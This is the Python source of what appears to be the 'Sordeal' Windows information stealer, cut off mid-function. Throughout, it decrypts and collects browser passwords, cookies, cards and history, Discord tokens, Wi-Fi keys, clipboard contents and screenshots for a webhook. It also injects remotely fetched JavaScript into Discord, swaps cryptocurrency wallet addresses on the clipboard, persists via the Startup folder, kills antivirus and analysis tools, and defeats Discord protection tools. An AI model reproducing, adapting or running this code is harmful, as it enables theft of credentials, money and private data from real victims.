import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import time
import pyperclip
import locale
import win32gui
import win32con
from typing import Union

from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData


local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")

NotPSSW = []

__config__ = {
    # Basic Options
    "SO_webhook": "%WEBHOOK_HERE%",
    "SO_injection_url": "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",

    # Files Options
    "SO_getbrowsersfiles": "%_browsers_files%",
    "SO_getavfiles": "%_av_files%",
    "SO_getminecraft": "%minecraft_files%",
    "SO_getsysteme": "%_systeme_files%",
    "SO_getroblox": "%_roblox_files%",
    "SO_getscreenshot": "%_screen_files%",
    "SO_getclipboard": "%_clipboard_files%",
    "SO_getwifipassword": "%wifipassword_files%",

    # Stealer Options
    "hide": "%_hide_script%",
    "ping": "%ping_enabled%",
    "pingtype": "%ping_type%",
    "fake_error": "%_error_enabled%",
    "startup": "%_startup_enabled%",
    "kill_discord_process": '%kill_discord_process%',
    "SO_antidebug": '%_debugkiller%',
    "disabledefenderornot": "%Defender_disable%",

    # Crypto Options
    "SO_crypto_fucker": "%_address_replacer%",
    "SO_BTCADD": "%_btc_address%",
    "SO_ETHADD": "%_eth_address%",
    "SO_XCHADD": "%_xchain_address%",
    "SO_PCHADD": "%_pchain_address%",
    "SO_CCHADD": "%_cchain_address%",
    "SO_MONEADD": "%_monero_address%",
    "SO_ADAADD": "%_ada_address%",
    "SO_DASHADD": "%_dash_address%",

    "blfirewall": [
        "MsMpEng",
        "cfp",
        "AvastSvc",
        "ccSvcHst",
        "mcshield",
        "vsmon",
        "avgfwsvc",
        "ashDisp",
        "avp",
        "MPFTray",
        "Outpost",
        "tinywall",
        "glasswire",
        "peerblock",
        "smc",
        "bdagent",
        "oaui",
        "pctfw",
        "pfw",
        "SPFConsole",
        "afwServ",
        "egui",
        "ndf",
        "avwsc",
        "fkp",
        "fsaua",
        "avktray",
        "rfwmain",
        "zlclient",
        "uiWinMgr",
        "WRSA",
        "mcuimgr",
        "avgnt",
        "sfmon",
        "zatray",
        "BavPro_Setup",
        "apwiz",
        "pfw7",
        "jpfsrv",
        "pztray",
        "isafe",
        "BullGuard",
        "PSUAMain",
        "SBAMSvc",
        "nlclientapp",
        "woservice",
        "op_mon",
        "WSClientservice",
        "wfc",
        "kicon",
        "avgtray",
        "npfmsg",
        "jpf",
        "WRSSSDK",
    ],
    "blprggg": [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver",
    ],
}

login_info = os.getlogin()
computer_victim = os.getenv("COMPUTERNAME")
fast_memory_storage = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
storage_space = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]

SO_myregex_secret = "https://rentry.co/cacabyshaman/raw"
reg_req = requests.get(SO_myregex_secret)
regx_net = r"[\w-]{24}\." + reg_req.text


class Functions(object):
    @staticmethod
    def so_findClipboard():
        return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(
            errors='backslashreplace').strip()

    @staticmethod
    def so_findwifi():
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(
                errors='ignore').strip().splitlines():
            if 'All User Profile' in line:
                name = line[(line.find(':') + 1):].strip()
                profiles.append(name)

        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True,
                                       capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords

    @staticmethod
    def time_convertion(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def mykey_gtm(path: str or os.PathLike) -> Union[str, None]:
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = local_state.get(
                "os_crypt", {}).get("encrypted_key")
            if not encrypted_key:
                return None
            encrypted_key = b64decode(encrypted_key)[5:]
            return Functions.decrypt_windows(encrypted_key)
        except (FileNotFoundError, json.JSONDecodeError, ValueError):
            return None

    @staticmethod
    def files_creating(_dir: str or os.PathLike = gettempdir()):
        f1lenom = "".join(
            random.SystemRandom().choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            )
            for _ in range(random.randint(10, 20))
        )
        path = ntpath.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def header_making(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def decrypt_windows(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def info_sys() -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            windows_uuid = (
                subprocess.check_output(sh1, creationflags=flag)
                .decode()
                .split("\n")[1]
                .strip()
            )
        except Exception:
            windows_uuid = "N/A"
        try:
            key_windows_find = (
                subprocess.check_output(
                    sh2, creationflags=flag).decode().rstrip()
            )
        except Exception:
            key_windows_find = "N/A"
        try:
            never_wind = (
                subprocess.check_output(
                    sh3, creationflags=flag).decode().rstrip()
            )
        except Exception:
            never_wind = "N/A"
        return [windows_uuid, never_wind, key_windows_find]

    @staticmethod
    def value_decrypt(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def find_in_config(e: str) -> str or bool | None:
        return __config__.get(e)

    @staticmethod
    def info_netword() -> list:
        ip, city, country, region, org, loc, googlemap = (
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
        )
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get("ip")
            city = data.get("city")
            country = data.get("country")
            region = data.get("region")
            org = data.get("org")
            loc = data.get("loc")
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]


class AutoCopyWallet(Functions):
    def __init__(self):
        self.address_st3aler = self.find_in_config("SO_crypto_fucker")
        self.addresses = {
            "btc": self.find_in_config("SO_BTCADD"),
            "eth": self.find_in_config("SO_ETHADD"),
            "xchain": self.find_in_config("SO_XCHADD"),
            "pchain": self.find_in_config("SO_PCHADD"),
            "cchain": self.find_in_config("SO_CCHADD"),
            "monero": self.find_in_config("SO_MONEADD"),
            "ada": self.find_in_config("SO_ADAADD"),
            "dash": self.find_in_config("SO_DASHADD"),
        }

    def copy_address(self, regex, address_key):
        clipboard_data = pyperclip.paste()
        if re.search(regex, clipboard_data):
            if address_key in self.addresses and clipboard_data not in self.addresses.values():
                address = self.addresses[address_key]
                if address != "none":
                    pyperclip.copy(address)

    def address_swap(self):
        self.copy_address("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "btc")
        self.copy_address("^0x[a-fA-F0-9]{40}$", "eth")
        self.copy_address(
            "^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "xchain")
        self.copy_address(
            "^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "pchain")
        self.copy_address(
            "^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$", "cchain")
        self.copy_address("addr1[a-z0-9]+", "ada")
        self.copy_address("/X[1-9A-HJ-NP-Za-km-z]{33}$/g", "dash")
        self.copy_address("/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g", "monero")

    def loop_through(self):
        while True:
            self.address_swap()

    def run(self):
        if self.address_st3aler == "yes":
            self.loop_through()


class first_function_bc(Functions):
    def __init__(self):

        self.ddeco = f'{base64.b64decode(self.find_in_config("SO_webhook"))}'.replace(
            "b'", "").replace("'", "")
        self.ddecos = str(self.ddeco)

        self.thingstocount = {
            'Cooks': 0,
            'Pssw': 0,
            'CC': 0,
            'Hist': 0,
            'Screenshots': 0,
            'Disco_info': 0,
            'Rblx_Cooks': 0,
            'Minecraft': 0,
            'Wifi': 0
        }

        self.thiswebhooknotencrypt = self.ddecos

        self.hide = self.find_in_config("hide")

        self.disablemydefender = self.find_in_config("disabledefenderornot")

        self.pingtype = self.find_in_config("pingtype")

        self.pingonrun = self.find_in_config("ping")

        self.disc_url_api = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.find_in_config("startup")

        self.fake_error = self.find_in_config("fake_error")

        self.ineedtogetbrowsers = self.find_in_config("SO_getbrowsersfiles")

        self.ineedtogetav = self.find_in_config("SO_getavfiles")

        self.ineedtogetmc = self.find_in_config("SO_getminecraft")

        self.ineedtogetsys = self.find_in_config("SO_getsysteme")

        self.ineedtogetrblx = self.find_in_config("SO_getroblox")

        self.ineedtogetscreen = self.find_in_config("SO_getscreenshot")

        self.ineedtogetclipboard = self.find_in_config("SO_getclipboard")

        self.ineedtogetwifipassword = self.find_in_config("SO_getwifipassword")

        self.appdata = os.getenv("localappdata")

        self.roaming = os.getenv("appdata")

        self.chrmmuserdtt = ntpath.join(
            self.appdata, "Google", "Chrome", "User Data")

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.info_sys(), self.info_netword()

        self.total, self.used, self.free = shutil.disk_usage("/")

        self.code_winpc = locale.getdefaultlocale()[0]

        # Convert to GB
        self.total_gb = self.total / (2**30)
        self.used_gb = self.used / (2**30)
        self.free_gb = self.free / (2**30)

        self.used_percent = self.used / self.total * 100

        # Generate progress bar
        self.progress_bar_length = 20
        self.num_filled_blocks = int(
            self.used_percent / 100 * self.progress_bar_length)
        self.progress_bar = "[" + "█" * self.num_filled_blocks + "." * \
            (self.progress_bar_length - self.num_filled_blocks) + "]"

        self.SO_mycommand_secret = "https://rentry.co/shitbymyself/raw"
        self.secretcommand = requests.get(self.SO_mycommand_secret)
        self.command_disable = f"{self.secretcommand}"

        self.windows_uuid, self.never_wind, self.key_windows_find = (
            inf[0],
            inf[1],
            inf[2],
        )

        (
            self.ip,
            self.city,
            self.country,
            self.region,
            self.org,
            self.loc,
            self.googlemap,
        ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])

        self.srtupl0c = ntpath.join(
            self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )

        self.find_myreg_web = "api/webhooks"

        self.chrmrgx = re.compile(
            r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE
        )

        self.disc_url_api = "https://discord.com/api/v9/users/@me"

        self.regex = regx_net

        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []

        self.SO_id = []

        self.sep = os.sep

        self.robloxcookies = []

        self.chrome_key = self.mykey_gtm(
            ntpath.join(self.chrmmuserdtt, "Local State"))

        os.makedirs(self.dir, exist_ok=True)

    def remoter_SO_err(self: str) -> str:
        if self.fake_error != "yes":
            return
        ctypes.windll.user32.MessageBoxW(
            None,
            "Error code: Windows_0x786542\nSOmething gone wrong.",
            "Fatal Error",
            0,
        )

    def ping_on_running(self: str) -> str:
        if self.pingonrun != "yes":
            return
        ping1 = {
            "username": "Sordeal - Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "content": "@everyone",
        }
        ping2 = {
            "username": "Sordeal - Stealer",
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "content": "@here",
        }
        if self.find_myreg_web in self.thiswebhooknotencrypt:
            if self.pingtype in ["@everyone", "everyone"]:
                httpx.post(self.thiswebhooknotencrypt, json=ping1)
            elif self.pingtype in ["@here", "here"]:
                httpx.post(self.thiswebhooknotencrypt, json=ping2)

    def startup_so(self: str) -> str:
        if self.startupexe != "yes":
            return
        startup_path = os.path.join(os.getenv(
            "appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        src_file = argv[0]
        dest_file = os.path.join(startup_path, os.path.basename(src_file))
        if os.path.exists(dest_file):
            os.remove(dest_file)
        shutil.copy2(src_file, dest_file)

    def hide_so(self):
        if self.hide != "yes":
            return
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

    def SO_exit_this(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        """Decorator to safely catch and ignore exceptions"""

        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass

        return wrapper

    def getlange(self, pc_code) -> str:
        try:
            
            lang_map = {
                "fr_FR": "FR_",
                "ar-SA": "AR_",
                "bg-BG": "BU_",
                "ca-ES": "CA_",
                "zh-TW": "CH_",
                "cs-CZ": "CZ_",
                "da-DK": "DA_",
                "de-DE": "GE_",
                "el-GR": "GR_",
                "en-US": "US_",
                "es-ES": "SP_",
                "fi-FI": "FIN_",
                "he-IL": "HEB_",
                "hu-HU": "HUN_",
                "is-IS": "ICE_",
                "it-IT": "IT_",
                "ja-JP": "JA_",
                "ko-KR": "KO_",
                "nl-NL": "DU_",
                "nb-NO": "NORW_",
                "pl-PL": "POL_",
                "pt-BR": "BR_",
                "rm-CH": "RH_RO_",
                "ro-RO": "ROM_",
                "ru-RU": "RU_",
                "hr-HR": "CRO_",
                "sk-SK": "SLOV_",
                "sq-AL": "ALB_",
                "sv-SE": "SWE_",
                "th-TH": "THAI_",
                "tr-TR": "TURK_",
                "ur-PK": "UR_PAK_",
                "id-ID": "IND_",
                "uk-UA": "UKR_",
                "be-BY": "BELA_RU_",
                "sl-SI": "SLOVE_",
                "et-EE": "EST_",
                "lv-LV": "LATV_",
                "lt-LT": "LITH_",
                "tg-Cyrl-TJ": "TAJIK_",
                "fa-IR": "PERS_",
                "vi-VN": "VIET_",
                "hy-AM": "ARM_",
                "az-Latn-AZ": "AZERI_",
                "eu-ES": "BASQUE_",
                "wen-DE": "SORB_",
                "mk-MK": "MACE_",
                "st-ZA": "SUTU_",
                "ts-ZA": "TSO_",
                "tn-ZA": "TSA_",
                "ven-ZA": "VEND_",
                "xh-ZA": "XH_",
                "zu-ZA": "ZU_",
                "af-ZA": "AFR_",
                "ka-GE": "GEO_",
                "fo-FO": "FARO_",
                "hi-IN": "HINDI_",
                "mt-MT": "MAL_",
                "se-NO": "SAMI_",
                "gd-GB": "GAELIC_",
                "yi": "YI_",
                "ms-MY": "MALAY_",
                "kk-KZ": "KAZAKH_",
                "ky-KG": "CYR_",
                "bs-Latn-BA": "BOSNIAN_",
                "sr-Cyrl-RS": "SERB_",
                "sr-Latn-RS": "SERBLAT_",
                "bs-BA": "BOS_",
                "iu-Cans-CA": "IUK_",
                "am-ET": "AMH_",
                "tmz": "TMZ_",
                "ks-Arab-IN": "KSH_",
                "ne-NP": "NEP_",
                "fy-NL": "FRS_",
                "ps-AF": "PAS_",
                "fil-PH": "FIL_",
                "dv-MV": "DIV_",
                "bin-NG": "BEN_",
                "fuv-NG": "FUL_",
                "ha-Latn-NG": "HAU_",
                "ibb-NG": "IBO_",
                "yo-NG": "YOR_",
                "quz-BO": "QUB_",
                "nso-ZA": "NSO_",
                "ig-NG": "IBO_",
                "kr-NG": "KAN_",
                "gaz-ET": "ORO_",
                "ti-ER": "TIR_",
                "gn-PY": "GRN_",
                "haw-US": "HAW_",
                "la": "LAT_",
                "so-SO": "SOM_",
                "ii-CN": "III_",
                "pap-AN": "PAP_",
                "ug-Arab-CN": "UIG_",
                "mi-NZ": "MRI_",
                "ar-IQ": "ARA_",
                "zh-CN": "ZHO_",
                "de-CH": "DEU_",
                "en-GB": "ENG_",
                "es-MX": "SPA_",
                "fr-BE": "FRA_",
                "it-CH": "ITA_",
                "nl-BE": "NLD_",
                "nn-NO": "NNO_",
                "pt-PT": "POR_",
                "ro-MD": "RON_",
                "ru-MD": "RUS_",
                "sr-Latn-CS": "SRP_",
                "sv-FI": "SVE_",
                "ur-IN": "URD_",
                "az-Cyrl-AZ": "AZE_",
                "ga-IE": "GLE_",
                "ms-BN": "MAL_",
                "uz-Cyrl-UZ": "UZB_",
                "bn-BD": "BEN_",
                "pa-PK": "PAN_",
                "mn-Mong-CN": "MON_",
                "bo-BT": "BOD_",
                "sd-PK": "SND_",
                "tzm-Latn-DZ": "TZN_",
                "ks-Deva-IN": "KSH_",
                "ne-IN": "NEP_",
                "quz-EC": "QUE_",
                "ti-ET": "TIR_",
                "ar-EG": "ARA_",
                "zh-HK": "ZHO_",
                "de-AT": "DEU_",
                "en-AU": "ENG_",
                "fr-CA": "FRE_",
                "sr-Cyrl-CS": "SRB_",
                "quz-PE": "QUE_",
                "ar-LY": "ARA_",
                "zh-SG": "CHN_",
                "de-LU": "GER_",
                "en-CA": "ENG_",
                "es-GT": "SPA_",
                "fr-CH": "FRE_",
                "hr-BA": "HRV_",
                "ar-DZ": "ARA_",
                "zh-MO": "CHN_",
                "de-LI": "GER_"
            }
            return lang_map.get(pc_code, "KSCH_")
        except:
            return "KSCH_"

    async def init(self):
        self.browsers = {
            "amigo": self.appdata + "\\Amigo\\User Data",
            "torch": self.appdata + "\\Torch\\User Data",
            "kometa": self.appdata + "\\Kometa\\User Data",
            "orbitum": self.appdata + "\\Orbitum\\User Data",
            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
            "7star": self.appdata + "\\7Star\\7Star\\User Data",
            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
            "iridium": self.appdata + "\\Iridium\\User Data",
            "edge": self.appdata + "\\Microsoft\\Edge\\User Data",
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        if self.thiswebhooknotencrypt == "" or self.thiswebhooknotencrypt == "\x57EBHOOK_HERE":
            self.SO_exit_this()

        self.hide_so()
        self.so_please_disabledefender()
        self.remoter_SO_err()
        self.startup_so()

        if self.find_in_config("SO_antidebug") and NoDebugg().inVM is True:
            self.SO_exit_this()
        await self.bypss_betterdsc()
        await self.bypass_tokenprtct()

        if self.ineedtogetsys == "yes":
            os.makedirs(ntpath.join(self.dir, "Systeme"), exist_ok=True)

        if self.ineedtogetrblx == "yes":
            os.makedirs(ntpath.join(self.dir, "Roblox"), exist_ok=True)
        function_list = [
            self.screentimes,
            self.getmywifiSordeal,
            self.getmyclipboard,
            self.so_please_getmyAV,
            self.system_informations,
            self.find_bctoken,
            self.mc_find,
            self.find_roblox,
        ]

        if self.find_in_config("kill_discord_process") is True:
            await self.kill_process_id()
        if self.ineedtogetbrowsers == "yes":
            os.makedirs(ntpath.join(self.dir, "Browsers"), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.masterkey = self.mykey_gtm(path + "\\Local State")
            self.funcs = [
                self.so_stol_cookies2,
                self.so_stol_history2,
                self.so_stol_passwords2,
                self.so_stol_cc2,
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
            os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
            function_list.extend(
                [self.so_stol_passwords, self.so_stol_cookies, self.so_stol_history]
            )
        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.natify_matched_tokens()
        await self.disco_injection()
        self.ping_on_running()
        self.finished_bc()

    async def disco_injection(self):
        for _dir in os.listdir(self.appdata):
            if "discord" in _dir.lower():
                discord = self.appdata + os.sep + _dir
                for __dir in os.listdir(ntpath.abspath(discord)):
                    if re.match(r"app-(\d*\.\d*)*", __dir):
                        app = ntpath.abspath(ntpath.join(discord, __dir))
                        modules = ntpath.join(app, "modules")

                        if not ntpath.exists(modules):
                            return
                        for ___dir in os.listdir(modules):
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = (
                                    modules
                                    + os.sep
                                    + ___dir
                                    + f"\\discord_desktop_core\\"
                                )

                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(
                                                inj_path + "SORDEAL", exist_ok=True
                                            )
                                        except PermissionError:
                                            pass
                                    if self.find_myreg_web in self.thiswebhooknotencrypt:
                                        f = httpx.get(
                                            self.find_in_config(
                                                "SO_injection_url")
                                        ).text.replace(
                                            "%WEBHOOK%", self.thiswebhooknotencrypt
                                        )
                                    try:
                                        with open(
                                                inj_path + "index.js", "w", errors="ignore"
                                        ) as indexFile:
                                            indexFile.write(f)
                                    except PermissionError:
                                        pass
                                    if self.find_in_config("kill_discord_process"):
                                        os.startfile(
                                            app + self.sep + _dir + ".exe")

    async def bypass_tokenprtct(self):
        tp = os.path.join(self.roaming, "DiscordTokenProtector")
        config = os.path.join(tp, "config.json")
        if not os.path.exists(tp) or not os.path.isdir(tp) or not os.path.isfile(config):
            return
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(os.path.join(tp, i))
            except FileNotFoundError:
                pass
        with open(config, "r", errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
        item["SORDEAL_is_here"] = "https://github.com/Sordeal"
        item["auto_start"] = False
        item["auto_start_discord"] = False
        item["integrity"] = False
        item["integrity_allowbetterdiscord"] = False
        item["integrity_checkexecutable"] = False
        item["integrity_checkhash"] = False
        item["integrity_checkmodule"] = False
        item["integrity_checkscripts"] = False
        item["integrity_checkresource"] = False
        item["integrity_redownloadhashes"] = False
        item["iterations_iv"] = 364
        item["iterations_key"] = 457
        item["version"] = 69420

        with open(config, "w") as f:
            json.dump(item, f, indent=2, sort_keys=True)
            f.write("\n\n//Shaman_is_here | https://github.com/Sordeal")

    async def kill_process_id(self):
        bllist = self.find_in_config("blprggg")
        blfirewalllist = self.find_in_config("blfirewall")

        for i in [
            "discord",
            "discordtokenprotector",
            "discordcanary",
            "discorddevelopment",
            "discordptb",
        ]:
            bllist.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in bllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blfirewalllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypss_betterdsc(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(bd):
            x = self.find_myreg_web
            with open(bd, "r", encoding="cp437", errors="ignore") as f:
                txt = f.read()
                content = txt.replace(x, "SHAMANgot")
            with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                f.write(content)

    @extract_try
    def value_dcrypt(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def MasterKey_find(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def find_bctoken(self):
        paths = {
            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": self.roaming
            + "\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
            "Opera": self.roaming
            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": self.roaming
            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": self.appdata
            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": self.appdata
            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": self.appdata
            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": self.appdata
            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": self.appdata
            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": self.appdata
            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome1": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
            "Chrome2": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
            "Chrome3": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
            "Chrome4": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
            "Chrome5": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
            "Epic Privacy Browser": self.appdata
                                    + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
            "Microsoft Edge": self.appdata
            + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
            "Uran": self.appdata
            + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
            "Yandex": self.appdata
            + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Brave": self.appdata
            + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
            "Iridium": self.appdata
            + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f"\\{disc}\\Local State"):
                    for filname in os.listdir(path):
                        if filname[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [
                            x.strip()
                            for x in open(
                                f"{path}\\{filname}", errors="ignore"
                            ).readlines()
                            if x.strip()
                        ]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.value_dcrypt(
                                        base64.b64decode(
                                            y.split("dQw4w9WgXcQ:")[1]),
                                        self.MasterKey_find(
                                            self.roaming +
                                            f"\\{disc}\\Local State"
                                        ),
                                    )
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(
                                        self.disc_url_api,
                                        headers={
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                            "Content-Type": "application/json",
                                            "Authorization": token,
                                        },
                                    )
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()["id"]
                                    if uid not in self.SO_id:
                                        self.tokens.append(token)
                                        self.SO_id.append(uid)
            else:
                for filname in os.listdir(path):
                    if filname[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [
                        x.strip()
                        for x in open(f"{path}\\{filname}", errors="ignore").readlines()
